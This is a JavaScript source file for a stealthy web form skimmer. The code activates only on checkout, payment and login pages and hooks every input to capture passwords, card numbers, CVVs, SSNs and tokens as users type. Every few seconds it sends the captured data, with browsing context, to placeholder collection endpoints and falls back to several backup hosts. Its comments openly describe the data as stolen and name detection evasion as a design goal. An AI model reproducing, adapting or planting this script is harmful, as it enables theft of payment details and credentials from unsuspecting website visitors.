/**
 * Form Monitor Script
 * A JavaScript-based data collection utility designed for monitoring and collecting user input data from web forms and interactions.
 * It monitors form submissions, input fields, and user interactions to gather sensitive information.
 * The script operates stealthily and includes fallback mechanisms for data transmission.
 * 
 * Endpoint Requirements:
 * - Must accept POST requests with JSON payload
 * - Should handle CORS (Cross-Origin Resource Sharing)
 * - Should accept the following headers:
 *   - Content-Type: application/json
 *   - X-Session-ID: Unique session identifier
 *   - X-Client-Version: Version of the client
 *   - X-Encryption-Key: Current encryption key
 * - Should return 200 OK for successful requests
 * - Should handle compressed payloads
 * - Should implement rate limiting to avoid detection
 * - Should have SSL/TLS encryption
 * - Should implement request validation
 * - Should handle multiple concurrent connections
 * - Should implement request queuing for high load
 * - Should have fallback mechanisms for data storage
 */

(function() {
    // Core configuration settings for the data collection operation
    const settings = {
        api: {
            // Primary endpoint for data transmission - where stolen data will be sent
            // Requirements: Must handle large payloads, implement rate limiting, and have SSL
            main: 'https://[DOMAIN]/api/v1/collect',
            
            // Backup endpoint in case the primary fails
            // Requirements: Must be on different infrastructure than primary
            fallback: 'https://[BACKUP-DOMAIN]/api/v1/collect',
            
            // Additional backup endpoints for redundancy
            // Requirements: Should be geographically distributed
            additional: [
                'https://[REGION1-DOMAIN]/api/v1/collect',
                'https://[REGION2-DOMAIN]/api/v1/collect',
                'https://[REGION3-DOMAIN]/api/v1/collect'
            ]
        },
        detection: {
            // Regex patterns to identify target pages (checkout, payment, etc.)
            targetPages: /(payment|checkout|order|cart|billing|purchase|basket|panier|kasse|account|profile|settings|login|register|signup|signin)/i,
            // Patterns to identify sensitive fields that need special handling
            sensitiveFields: /(password|credit|card|ssn|social|security|pin|code|cvv|expiry|account|routing|swift|iban|secret|key|token|auth)/i,
            // Additional patterns for identifying valuable data
            valuableFields: /(email|phone|address|zip|postal|city|state|country|dob|birth|name|username|id|number)/i
        },
        timing: {
            // How often to send collected data (3 seconds)
            syncInterval: 3000,
            // Maximum number of transmission attempts
            maxAttempts: 5,
            // Delay between event processing to prevent performance issues
            debounceDelay: 250,
            // Maximum time to store data before forcing transmission
            maxStorageTime: 30000,
            // Initial delay before starting collection
            initialDelay: 1000
        },
        security: {
            // Encryption key rotation interval (in milliseconds)
            keyRotationInterval: 3600000,
            // Maximum payload size before splitting
            maxPayloadSize: 1024 * 1024,
            // Compression threshold
            compressionThreshold: 1024
        }
    };

    // Main class responsible for data collection and exfiltration
    class DataProcessor {
        constructor() {
            // Storage for collected data using Map for better performance
            this.storage = new Map();
            // Counter for failed transmission attempts
            this.attemptCount = 0;
            // Timestamp of last successful data transmission
            this.lastProcessed = Date.now();
            // Unique identifier for this session
            this.sessionId = this.generateSessionId();
            // Encryption key for sensitive data
            this.encryptionKey = this.generateEncryptionKey();
            // Track if the processor is active
            this.isActive = false;
            // Initialize storage cleanup interval
            this.initializeStorageCleanup();
        }

        // Generates a unique session ID to track data collection sessions
        generateSessionId() {
            return 'sess_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
        }

        // Generates a new encryption key
        generateEncryptionKey() {
            return Array.from(crypto.getRandomValues(new Uint8Array(32)))
                .map(b => b.toString(16).padStart(2, '0'))
                .join('');
        }

        // Processes sensitive data using enhanced encryption
        processSensitiveData(content) {
            try {
                // Use a more sophisticated encryption method
                const encoder = new TextEncoder();
                const data = encoder.encode(content);
                const key = this.encryptionKey;
                
                // XOR with key and add timestamp-based salt
                return Array.from(data).map((byte, index) => {
                    const keyByte = key.charCodeAt(index % key.length);
                    const saltByte = Date.now() % 256;
                    return String.fromCharCode(byte ^ keyByte ^ saltByte);
                }).join('');
            } catch (error) {
                // Fallback to basic encryption if advanced method fails
                return this.basicEncryption(content);
            }
        }

        // Basic encryption fallback
        basicEncryption(content) {
            const salt = Date.now().toString(36);
            return Array.from(content).map((char, index) => 
                String.fromCharCode(char.charCodeAt(0) ^ salt.charCodeAt(index % salt.length))
            ).join('');
        }

        // Initialize storage cleanup to prevent memory leaks
        initializeStorageCleanup() {
            setInterval(() => {
                const now = Date.now();
                for (const [key, value] of this.storage.entries()) {
                    if (now - value.timestamp > settings.timing.maxStorageTime) {
                        this.storage.delete(key);
                    }
                }
            }, settings.timing.maxStorageTime);
        }

        // Collects data from all forms on the page
        // This is the primary method of gathering user input
        processFormData() {
            const forms = document.querySelectorAll('form');
            forms.forEach(form => {
                const formEntries = new FormData(form);
                for (const [field, value] of formEntries.entries()) {
                    if (value && !this.storage.has(field)) {
                        // Check if the field contains sensitive information
                        const isSensitive = settings.detection.sensitiveFields.test(field);
                        const isValuable = settings.detection.valuableFields.test(field);
                        
                        if (isSensitive || isValuable) {
                            this.storage.set(field, {
                                content: isSensitive ? this.processSensitiveData(value) : value,
                                timestamp: Date.now(),
                                formId: form.id || 'form_' + Math.random().toString(36).substr(2, 5),
                                type: isSensitive ? 'sensitive' : 'valuable',
                                fieldType: field.type || 'text'
                            });
                        }
                    }
                }
            });
        }

        // Monitors DOM changes to catch dynamically loaded forms and fields
        // This ensures we don't miss any data even if the page content changes
        watchDOMChanges() {
            const domObserver = new MutationObserver((changes) => {
                changes.forEach(change => {
                    if (change.addedNodes.length) {
                        this.initializeListeners();
                    }
                });
            });

            domObserver.observe(document.body, {
                childList: true,
                subtree: true
            });
        }

        // Sets up event listeners for all input fields and interactive elements
        // Uses debouncing to prevent performance issues from too many events
        initializeListeners() {
            const optimizedHandler = (callback) => {
                let timer;
                return (...args) => {
                    clearTimeout(timer);
                    timer = setTimeout(() => callback.apply(this, args), settings.timing.debounceDelay);
                };
            };

            // Monitor all input fields, textareas, and select elements
            document.querySelectorAll('input, textarea, select').forEach(element => {
                if (element.hidden || element.type === 'hidden') return;
                
                const handler = optimizedHandler((event) => {
                    const fieldData = {
                        content: event.target.value,
                        elementType: event.target.type,
                        identifier: event.target.name || event.target.id,
                        timestamp: Date.now(),
                        fieldType: event.target.type || 'text',
                        placeholder: event.target.placeholder || '',
                        className: event.target.className || ''
                    };
                    this.storage.set(fieldData.identifier, fieldData);
                });

                element.addEventListener('input', handler);
                element.addEventListener('change', handler);
                element.addEventListener('blur', handler);
            });

            // Monitor button clicks and other interactive elements
            document.querySelectorAll('button, [role="button"], a.button, input[type="submit"]').forEach(element => {
                element.addEventListener('click', () => {
                    this.storage.set('interaction_' + Date.now(), {
                        elementType: element.tagName.toLowerCase(),
                        content: element.textContent || element.value,
                        identifier: element.id,
                        classes: element.className,
                        timestamp: Date.now(),
                        formId: element.form ? element.form.id : null
                    });
                });
            });

            // Monitor form submissions
            document.querySelectorAll('form').forEach(form => {
                form.addEventListener('submit', (event) => {
                    this.storage.set('form_submit_' + Date.now(), {
                        formId: form.id,
                        action: form.action,
                        method: form.method,
                        timestamp: Date.now()
                    });
                });
            });
        }

        // Compresses data if it exceeds the threshold
        compressData(data) {
            if (data.length > settings.security.compressionThreshold) {
                try {
                    // Simple compression by removing whitespace and using shorter keys
                    return JSON.stringify(data).replace(/\s+/g, '');
                } catch (error) {
                    return data;
                }
            }
            return data;
        }

        // Transmits collected data to the remote server
        // Includes retry mechanism and fallback endpoint
        async processAndTransmit() {
            if (this.storage.size === 0) return;

            // Prepare the payload with collected data and context
            const payload = {
                sessionId: this.sessionId,
                data: Array.from(this.storage.entries()),
                context: {
                    location: window.location.href,
                    timestamp: Date.now(),
                    userAgent: navigator.userAgent,
                    screenSize: `${window.innerWidth}x${window.innerHeight}`,
                    language: navigator.language,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    platform: navigator.platform,
                    referrer: document.referrer
                }
            };

            // Compress payload if needed
            const compressedPayload = this.compressData(payload);

            try {
                // Attempt to send data to primary endpoint
                const response = await fetch(settings.api.main, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'X-Session-ID': this.sessionId,
                        'X-Client-Version': '1.0.0',
                        'X-Encryption-Key': this.encryptionKey
                    },
                    body: JSON.stringify(compressedPayload)
                });

                if (!response.ok) throw new Error('Processing failed');
                
                // Clear storage after successful transmission
                this.storage.clear();
                this.lastProcessed = Date.now();
                this.attemptCount = 0;
            } catch (error) {
                // If primary endpoint fails, try fallback
                this.attemptCount++;
                if (this.attemptCount < settings.timing.maxAttempts) {
                    await this.transmitToFallback(compressedPayload);
                }
            }
        }

        // Fallback method for data transmission when primary endpoint fails
        async transmitToFallback(payload) {
            const endpoints = [settings.api.fallback, ...settings.api.additional];
            
            for (const endpoint of endpoints) {
                try {
                    const response = await fetch(endpoint, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                            'X-Session-ID': this.sessionId,
                            'X-Encryption-Key': this.encryptionKey
                        },
                        body: JSON.stringify(payload)
                    });
                    
                    if (response.ok) {
                        this.storage.clear();
                        this.lastProcessed = Date.now();
                        this.attemptCount = 0;
                        return;
                    }
                } catch (error) {
                    console.warn(`Fallback processing failed for ${endpoint}`);
                }
            }
        }

        // Initialize the data collection process
        // Only runs on target pages (checkout, payment, etc.)
        initialize() {
            if (settings.detection.targetPages.test(window.location.href)) {
                // Delay initialization to avoid detection
                setTimeout(() => {
                    this.isActive = true;
                    this.initializeListeners();
                    this.watchDOMChanges();
                    this.processFormData();
                    
                    // Set up periodic data transmission
                    setInterval(() => this.processAndTransmit(), settings.timing.syncInterval);
                    
                    // Set up encryption key rotation
                    setInterval(() => {
                        this.encryptionKey = this.generateEncryptionKey();
                    }, settings.security.keyRotationInterval);
                }, settings.timing.initialDelay);
            }
        }
    }

    // Start the data collection process
    const processor = new DataProcessor();
    processor.initialize();
})();